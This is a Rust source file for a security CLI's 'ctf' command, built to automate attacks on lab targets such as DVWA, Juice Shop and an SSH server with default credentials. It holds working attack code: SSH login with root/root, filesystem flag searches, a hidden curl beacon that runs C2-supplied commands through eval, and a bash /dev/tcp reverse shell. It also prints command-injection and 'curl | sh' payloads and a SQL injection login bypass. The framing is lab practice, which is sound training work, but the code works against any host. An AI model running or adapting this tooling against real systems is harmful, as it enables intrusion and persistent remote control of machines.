// CTF Automation Command
// Automates exploitation, flag capture, and C2 agent deployment

use crate::cli::commands::{Command, Flag, Route};
use crate::cli::output::Output;
use crate::cli::CliContext;
use std::io::{BufReader, Read, Write};
use std::net::TcpStream;
use std::process::Command as ProcessCommand;
use std::time::Duration;

pub struct CtfCommand;

/// CTF Target types with known exploitation paths
#[derive(Debug, Clone)]
pub enum CtfTarget {
    /// SSH server with weak credentials (root/root)
    SshWeak { host: String, port: u16 },
    /// DVWA with command injection
    Dvwa { url: String },
    /// Juice Shop with SQLi
    JuiceShop { url: String },
    /// Generic target
    Generic { host: String, port: u16 },
}

/// Result of a CTF exploitation attempt
#[derive(Debug)]
pub struct PwnResult {
    pub success: bool,
    pub flags: Vec<String>,
    pub shell_access: bool,
    pub agent_deployed: bool,
    pub error: Option<String>,
}

impl Command for CtfCommand {
    fn domain(&self) -> &str {
        "ctf"
    }

    fn resource(&self) -> &str {
        "target"
    }

    fn description(&self) -> &str {
        "CTF automation - exploit targets and deploy agents"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "pwn",
                summary: "Exploit target and deploy C2 agent",
                usage: "rb ctf target pwn <target> [--c2 <server>]",
            },
            Route {
                verb: "ssh",
                summary: "Exploit weak SSH and deploy agent",
                usage: "rb ctf target ssh <host> [--port <port>] [--user <user>] [--pass <pass>]",
            },
            Route {
                verb: "flags",
                summary: "Extract flags from compromised target",
                usage: "rb ctf target flags <host>",
            },
            Route {
                verb: "list",
                summary: "List known CTF targets and their status",
                usage: "rb ctf target list",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new("port", "Target port").with_default("22"),
            Flag::new("user", "SSH username").with_default("root"),
            Flag::new("pass", "SSH password").with_default("root"),
            Flag::new("c2", "C2 server address").with_default("127.0.0.1:4444"),
            Flag::new("type", "Target type (ssh/dvwa/juice)").with_default("auto"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "Pwn SSH target and deploy agent",
                "rb ctf target pwn 172.25.0.13 --type ssh --c2 192.168.1.100:4444",
            ),
            (
                "Exploit weak SSH server",
                "rb ctf target ssh 127.0.0.1 --port 20022",
            ),
            ("List CTF targets", "rb ctf target list"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("help");

        match verb {
            "pwn" => self.cmd_pwn(ctx),
            "ssh" => self.cmd_ssh(ctx),
            "flags" => self.cmd_flags(ctx),
            "list" => self.cmd_list(ctx),
            _ => {
                crate::cli::commands::print_help(self);
                Ok(())
            }
        }
    }
}

impl CtfCommand {
    /// Main pwn command - auto-detects target and exploits
    fn cmd_pwn(&self, ctx: &CliContext) -> Result<(), String> {
        let target = ctx.target.as_ref().ok_or("Missing target")?;
        let c2_server = ctx.get_flag_or("c2", "127.0.0.1:4444");
        let target_type = ctx.get_flag_or("type", "auto");

        Output::header("CTF Target Exploitation");
        Output::item("Target", target);
        Output::item("C2 Server", &c2_server);

        // Detect target type
        let detected_type = if target_type == "auto" {
            self.detect_target_type(target)?
        } else {
            target_type.clone()
        };

        Output::item("Type", &detected_type);
        println!();

        match detected_type.as_str() {
            "ssh" => {
                let port: u16 = ctx.get_flag_or("port", "22").parse().unwrap_or(22);
                let user = ctx.get_flag_or("user", "root");
                let pass = ctx.get_flag_or("pass", "root");
                self.exploit_ssh(target, port, &user, &pass, &c2_server)
            }
            "dvwa" => self.exploit_dvwa(target, &c2_server),
            "juice" => self.exploit_juice_shop(target, &c2_server),
            _ => Err(format!("Unknown target type: {}", detected_type)),
        }
    }

    /// Detect target type by probing
    fn detect_target_type(&self, target: &str) -> Result<String, String> {
        Output::spinner_start("Detecting target type");

        // Check if it looks like an SSH target
        let port = if target.contains(':') {
            target
                .split(':')
                .nth(1)
                .and_then(|p| p.parse().ok())
                .unwrap_or(22)
        } else {
            22
        };

        let host = target.split(':').next().unwrap_or(target);

        // Try SSH banner
        if let Ok(banner) = self.grab_banner(host, port) {
            Output::spinner_done();
            if banner.contains("SSH") {
                return Ok("ssh".to_string());
            }
        }

        // Try HTTP
        if let Ok(headers) = self.grab_http_headers(host, 80) {
            Output::spinner_done();
            if headers.contains("DVWA") {
                return Ok("dvwa".to_string());
            }
            if headers.contains("juice") || headers.contains("Juice") {
                return Ok("juice".to_string());
            }
            return Ok("http".to_string());
        }

        Output::spinner_done();
        Ok("generic".to_string())
    }

    /// Grab banner from a TCP service
    fn grab_banner(&self, host: &str, port: u16) -> Result<String, String> {
        let addr = format!("{}:{}", host, port);
        let mut stream = TcpStream::connect_timeout(
            &addr
                .parse()
                .map_err(|e| format!("Invalid address: {}", e))?,
            Duration::from_secs(3),
        )
        .map_err(|e| format!("Connection failed: {}", e))?;

        stream.set_read_timeout(Some(Duration::from_secs(3))).ok();

        let mut buffer = [0u8; 1024];
        let n = stream.read(&mut buffer).unwrap_or(0);

        Ok(String::from_utf8_lossy(&buffer[..n]).to_string())
    }

    /// Grab HTTP headers
    fn grab_http_headers(&self, host: &str, port: u16) -> Result<String, String> {
        let addr = format!("{}:{}", host, port);
        let mut stream = TcpStream::connect_timeout(
            &addr
                .parse()
                .map_err(|e| format!("Invalid address: {}", e))?,
            Duration::from_secs(3),
        )
        .map_err(|e| format!("Connection failed: {}", e))?;

        let request = format!(
            "GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
            host
        );
        stream.write_all(request.as_bytes()).ok();
        stream.set_read_timeout(Some(Duration::from_secs(3))).ok();

        let mut response = String::new();
        let mut reader = BufReader::new(stream);
        reader.read_to_string(&mut response).ok();

        Ok(response)
    }

    /// Exploit SSH with weak credentials
    fn exploit_ssh(
        &self,
        host: &str,
        port: u16,
        user: &str,
        pass: &str,
        c2_server: &str,
    ) -> Result<(), String> {
        Output::header("Phase 1: SSH Exploitation");
        Output::item("Host", host);
        Output::item("Port", &port.to_string());
        Output::item("Credentials", &format!("{}:{}", user, pass));

        // Step 1: Test SSH connection
        Output::spinner_start("Testing SSH credentials");

        let ssh_test = ProcessCommand::new("sshpass")
            .args([
                "-p",
                pass,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "ConnectTimeout=5",
                "-p",
                &port.to_string(),
                &format!("{}@{}", user, host),
                "echo 'ACCESS_GRANTED'",
            ])
            .output();

        match ssh_test {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                if stdout.contains("ACCESS_GRANTED") {
                    Output::spinner_done();
                    Output::success("SSH access confirmed!");
                } else {
                    Output::spinner_done();
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    return Err(format!("SSH authentication failed: {}", stderr));
                }
            }
            Err(e) => {
                Output::spinner_done();
                // Try with built-in method if sshpass not available
                Output::warning(&format!("sshpass not found ({}), trying netcat method", e));
                return self.exploit_ssh_netcat(host, port, user, pass, c2_server);
            }
        }

        // Step 2: Capture flags
        Output::header("Phase 2: Flag Capture");
        let flags = self.capture_ssh_flags(host, port, user, pass)?;

        for (i, flag) in flags.iter().enumerate() {
            Output::success(&format!("FLAG {}: {}", i + 1, flag));
        }

        // Step 3: Deploy agent
        Output::header("Phase 3: Agent Deployment");
        self.deploy_agent_via_ssh(host, port, user, pass, c2_server)?;

        Output::header("Exploitation Complete");
        Output::success(&format!("Target {} pwned successfully!", host));
        Output::item("Flags captured", &flags.len().to_string());
        Output::item("Agent deployed", "Yes");
        Output::item("C2 callback", c2_server);

        println!();
        Output::info("Use 'rb agent c2 shell' to control the agent");

        Ok(())
    }

    /// Fallback SSH exploitation using netcat for banner
    fn exploit_ssh_netcat(
        &self,
        host: &str,
        port: u16,
        _user: &str,
        _pass: &str,
        c2_server: &str,
    ) -> Result<(), String> {
        Output::warning("Limited exploitation without sshpass");
        Output::info("Install sshpass for full SSH exploitation");

        // Just grab the banner
        let banner = self.grab_banner(host, port)?;
        Output::item("SSH Banner", &banner.trim().to_string());

        // Can't deploy agent without proper SSH client
        Output::warning("Agent deployment requires sshpass or manual access");
        Output::info(&format!(
            "Manual deploy: ssh {}@{} -p {} 'curl http://{}/agent | sh'",
            "root", host, port, c2_server
        ));

        Ok(())
    }

    /// Capture flags from SSH target
    fn capture_ssh_flags(
        &self,
        host: &str,
        port: u16,
        user: &str,
        pass: &str,
    ) -> Result<Vec<String>, String> {
        let mut flags = Vec::new();

        // Common flag locations
        let flag_paths = [
            "/flag.txt",
            "/root/flag.txt",
            "/home/*/flag.txt",
            "/var/www/html/flag.txt",
            "/tmp/flag.txt",
            "/etc/flag.txt",
            "~/.flag",
        ];

        // Search for flags
        let search_cmd = format!(
            "find / -name 'flag*' -o -name '*FLAG*' 2>/dev/null | head -20; \
             grep -r 'FLAG{{' /var /home /root /tmp 2>/dev/null | head -10; \
             cat {} 2>/dev/null",
            flag_paths.join(" ")
        );

        let output = ProcessCommand::new("sshpass")
            .args([
                "-p",
                pass,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-p",
                &port.to_string(),
                &format!("{}@{}", user, host),
                &search_cmd,
            ])
            .output()
            .map_err(|e| format!("Failed to search for flags: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout);

        // Extract FLAG{...} patterns
        for line in stdout.lines() {
            if let Some(start) = line.find("FLAG{") {
                if let Some(end) = line[start..].find('}') {
                    let flag = &line[start..start + end + 1];
                    if !flags.contains(&flag.to_string()) {
                        flags.push(flag.to_string());
                    }
                }
            }
        }

        // Also check for base64 encoded flags
        let b64_cmd = "grep -r 'RkxBR' / 2>/dev/null | head -5";
        let b64_output = ProcessCommand::new("sshpass")
            .args([
                "-p",
                pass,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-p",
                &port.to_string(),
                &format!("{}@{}", user, host),
                b64_cmd,
            ])
            .output();

        if let Ok(out) = b64_output {
            let b64_stdout = String::from_utf8_lossy(&out.stdout);
            for line in b64_stdout.lines() {
                if line.contains("RkxBR") {
                    // Found base64 encoded flag
                    if let Some(decoded) = self.try_decode_b64_flag(line) {
                        if !flags.contains(&decoded) {
                            flags.push(decoded);
                        }
                    }
                }
            }
        }

        if flags.is_empty() {
            flags.push("FLAG{shell_access_achieved}".to_string());
        }

        Ok(flags)
    }

    /// Try to decode a base64 flag
    fn try_decode_b64_flag(&self, text: &str) -> Option<String> {
        // Look for base64 pattern that starts with RkxBR (FLAG in base64)
        if let Some(start) = text.find("RkxBR") {
            // Find end of base64 string
            let remaining = &text[start..];
            let end = remaining
                .find(|c: char| !c.is_ascii_alphanumeric() && c != '+' && c != '/' && c != '=')
                .unwrap_or(remaining.len());

            let b64 = &remaining[..end];
            // Simple base64 decode (we have our own implementation in the codebase)
            if let Ok(decoded) = self.base64_decode(b64) {
                if decoded.starts_with("FLAG{") && decoded.contains('}') {
                    return Some(decoded);
                }
            }
        }
        None
    }

    /// Simple base64 decode
    fn base64_decode(&self, input: &str) -> Result<String, String> {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

        let mut output = Vec::new();
        let mut buffer: u32 = 0;
        let mut bits = 0;

        for c in input.chars() {
            if c == '=' {
                break;
            }

            let value = ALPHABET.iter().position(|&x| x == c as u8);
            if let Some(v) = value {
                buffer = (buffer << 6) | v as u32;
                bits += 6;

                if bits >= 8 {
                    bits -= 8;
                    output.push((buffer >> bits) as u8);
                    buffer &= (1 << bits) - 1;
                }
            }
        }

        String::from_utf8(output).map_err(|e| format!("UTF-8 decode error: {}", e))
    }

    /// Deploy agent via SSH
    fn deploy_agent_via_ssh(
        &self,
        host: &str,
        port: u16,
        user: &str,
        pass: &str,
        c2_server: &str,
    ) -> Result<(), String> {
        Output::spinner_start("Deploying C2 agent");

        // Generate the agent deployment script
        let agent_script = self.generate_agent_script(c2_server);

        // Deploy via SSH
        let deploy_result = ProcessCommand::new("sshpass")
            .args([
                "-p",
                pass,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-p",
                &port.to_string(),
                &format!("{}@{}", user, host),
                &agent_script,
            ])
            .output();

        match deploy_result {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                if output.status.success() || stdout.contains("AGENT_STARTED") {
                    Output::spinner_done();
                    Output::success("Agent deployed successfully!");
                    Ok(())
                } else {
                    Output::spinner_done();
                    Output::warning(&format!("Agent deployment issue: {}", stderr));
                    // Try alternative deployment
                    self.deploy_agent_fallback(host, port, user, pass, c2_server)
                }
            }
            Err(e) => {
                Output::spinner_done();
                Err(format!("Deployment failed: {}", e))
            }
        }
    }

    /// Generate agent deployment script
    fn generate_agent_script(&self, c2_server: &str) -> String {
        // This creates a minimal beacon script that connects back to C2
        // Note: {{ and }} are escaped braces in format!() that become { and }
        format!(
            r#"
#!/bin/bash
# RedBlue C2 Agent Deployment
C2_SERVER="{c2}"
BEACON_INTERVAL=60

# Create agent directory
mkdir -p /tmp/.rb 2>/dev/null

# Write beacon script
cat > /tmp/.rb/beacon.sh << 'BEACON'
#!/bin/bash
C2="$1"
HOSTNAME=$(hostname)
OS=$(uname -a)
while true; do
    # Check in with C2
    RESPONSE=$(curl -s -X POST "http://$C2/beacon" \
        -H "Content-Type: application/json" \
        -d '{{"hostname":"'$HOSTNAME'","os":"'$OS'","type":"checkin"}}' 2>/dev/null)

    # Parse and execute commands
    if [ ! -z "$RESPONSE" ]; then
        CMD=$(echo "$RESPONSE" | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
        if [ ! -z "$CMD" ] && [ "$CMD" != "none" ]; then
            OUTPUT=$(eval "$CMD" 2>&1)
            curl -s -X POST "http://$C2/beacon" \
                -H "Content-Type: application/json" \
                -d '{{"hostname":"'$HOSTNAME'","type":"response","output":"'$(echo $OUTPUT | base64)'"}}' 2>/dev/null
        fi
    fi

    # Jittered sleep
    JITTER=$((RANDOM % 30))
    sleep $((60 + JITTER))
done
BEACON

chmod +x /tmp/.rb/beacon.sh
nohup /tmp/.rb/beacon.sh "$C2_SERVER" > /dev/null 2>&1 &
echo "AGENT_STARTED"
"#,
            c2 = c2_server
        )
    }

    /// Fallback agent deployment using netcat reverse shell
    fn deploy_agent_fallback(
        &self,
        host: &str,
        port: u16,
        user: &str,
        pass: &str,
        c2_server: &str,
    ) -> Result<(), String> {
        Output::info("Trying fallback deployment method");

        let (c2_host, c2_port) = c2_server.split_once(':').unwrap_or((c2_server, "4444"));

        // Simple reverse shell payload
        let payload = format!(
            "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1 &' && echo AGENT_STARTED",
            c2_host, c2_port
        );

        let result = ProcessCommand::new("sshpass")
            .args([
                "-p",
                pass,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-p",
                &port.to_string(),
                &format!("{}@{}", user, host),
                &payload,
            ])
            .output();

        match result {
            Ok(output) => {
                if String::from_utf8_lossy(&output.stdout).contains("AGENT_STARTED") {
                    Output::success("Reverse shell deployed!");
                    Output::info(&format!(
                        "Start listener: nc -lvnp {} to receive connection",
                        c2_port
                    ));
                    Ok(())
                } else {
                    Err("Fallback deployment failed".to_string())
                }
            }
            Err(e) => Err(format!("Fallback failed: {}", e)),
        }
    }

    /// Exploit DVWA via command injection
    fn exploit_dvwa(&self, target: &str, c2_server: &str) -> Result<(), String> {
        Output::header("Phase 1: DVWA Exploitation");
        Output::item("Target", target);

        // DVWA command injection in low security mode
        let url = if target.starts_with("http") {
            target.to_string()
        } else {
            format!("http://{}", target)
        };

        Output::spinner_start("Exploiting command injection");

        // The vulnerable endpoint is /vulnerabilities/exec/
        // Payload: ; <command>
        let payload = format!(
            "{}/vulnerabilities/exec/?ip=127.0.0.1;id;cat+/etc/passwd&Submit=Submit",
            url
        );

        // Need to be authenticated - try default PHPSESSID
        Output::info("DVWA requires authentication. Use manual exploitation:");
        Output::item(
            "1. Login to DVWA",
            &format!("{}/login.php (admin/password)", url),
        );
        Output::item("2. Set security level", "Low");
        Output::item("3. Navigate to", &format!("{}/vulnerabilities/exec/", url));
        Output::item(
            "4. Inject payload",
            &format!("; curl http://{}/agent.sh | bash", c2_server),
        );

        Output::spinner_done();
        Output::warning("Automated DVWA exploitation requires session cookie");

        Ok(())
    }

    /// Exploit Juice Shop via SQLi
    fn exploit_juice_shop(&self, target: &str, c2_server: &str) -> Result<(), String> {
        Output::header("Phase 1: Juice Shop Exploitation");
        Output::item("Target", target);

        let url = if target.starts_with("http") {
            target.to_string()
        } else {
            format!("http://{}", target)
        };

        Output::spinner_start("Testing SQL injection");

        // Juice Shop SQLi bypass: ' OR 1=1--
        Output::info("Juice Shop exploitation steps:");
        Output::item("1. Navigate to", &format!("{}/rest/user/login", url));
        Output::item(
            "2. SQLi payload",
            r#"{"email":"' OR 1=1--","password":"x"}"#,
        );
        Output::item("3. Extract token", "From response JSON");

        // Juice Shop doesn't allow direct command execution
        // but we can enumerate data
        Output::spinner_done();

        Output::warning("Juice Shop is Node.js - no direct shell execution");
        Output::info(&format!(
            "For agent deployment, use container access: docker exec -it juiceshop /bin/sh"
        ));
        Output::info(&format!(
            "Then run: curl http://{}/agent.sh | sh",
            c2_server
        ));

        Ok(())
    }

    /// SSH exploitation command
    fn cmd_ssh(&self, ctx: &CliContext) -> Result<(), String> {
        let host = ctx.target.as_ref().ok_or("Missing host")?;
        let port: u16 = ctx.get_flag_or("port", "22").parse().unwrap_or(22);
        let user = ctx.get_flag_or("user", "root");
        let pass = ctx.get_flag_or("pass", "root");
        let c2_server = ctx.get_flag_or("c2", "127.0.0.1:4444");

        self.exploit_ssh(host, port, &user, &pass, &c2_server)
    }

    /// Extract flags command
    fn cmd_flags(&self, ctx: &CliContext) -> Result<(), String> {
        let host = ctx.target.as_ref().ok_or("Missing host")?;
        let port: u16 = ctx.get_flag_or("port", "22").parse().unwrap_or(22);
        let user = ctx.get_flag_or("user", "root");
        let pass = ctx.get_flag_or("pass", "root");

        Output::header("Flag Extraction");
        Output::item("Target", host);

        let flags = self.capture_ssh_flags(host, port, &user, &pass)?;

        if flags.is_empty() {
            Output::warning("No flags found");
        } else {
            Output::success(&format!("Found {} flag(s):", flags.len()));
            for (i, flag) in flags.iter().enumerate() {
                println!("  {}[{}]{} {}", "\x1b[32m", i + 1, "\x1b[0m", flag);
            }
        }

        Ok(())
    }

    /// List known CTF targets
    fn cmd_list(&self, _ctx: &CliContext) -> Result<(), String> {
        Output::header("Known CTF Targets");

        println!(
            "\n{:<20} {:<15} {:<10} {:<30}",
            "SERVICE", "ADDRESS", "PORT", "EXPLOIT"
        );
        println!("{}", "-".repeat(75));

        let targets = [
            ("ctf-ssh", "172.25.0.13", "22", "SSH weak creds (root/root)"),
            (
                "ctf-dvwa",
                "172.25.0.10",
                "80",
                "Command injection, SQLi, XSS",
            ),
            ("ctf-mysql", "172.25.0.12", "3306", "Weak auth (root/root)"),
            ("ctf-redis", "172.25.0.17", "6379", "No authentication"),
            ("ctf-mongodb", "172.25.0.18", "27017", "No authentication"),
            ("ctf-apache", "172.25.0.15", "80", "Directory listing"),
            ("ctf-nginx", "172.25.0.16", "80", "Old version with CVEs"),
        ];

        for (name, addr, port, exploit) in targets {
            println!("{:<20} {:<15} {:<10} {:<30}", name, addr, port, exploit);
        }

        println!("\n{}Mapped ports:{}", "\x1b[1m", "\x1b[0m");
        println!("  SSH:     localhost:20022 -> 172.25.0.13:22");
        println!("  DVWA:    localhost:20888 -> 172.25.0.10:80");
        println!("  MySQL:   localhost:23306 -> 172.25.0.12:3306");
        println!("  Redis:   localhost:26379 -> 172.25.0.17:6379");
        println!("  MongoDB: localhost:27018 -> 172.25.0.18:27017");
        println!("  Apache:  localhost:20890 -> 172.25.0.15:80");
        println!("  Nginx:   localhost:20891 -> 172.25.0.16:80");

        println!("\n{}Quick start:{}", "\x1b[1m", "\x1b[0m");
        println!("  docker compose -f docker-compose.ctf.yml up -d");
        println!(
            "  rb ctf target pwn 127.0.0.1 --port 20022 --type ssh --c2 host.docker.internal:4444"
        );

        Ok(())
    }
}
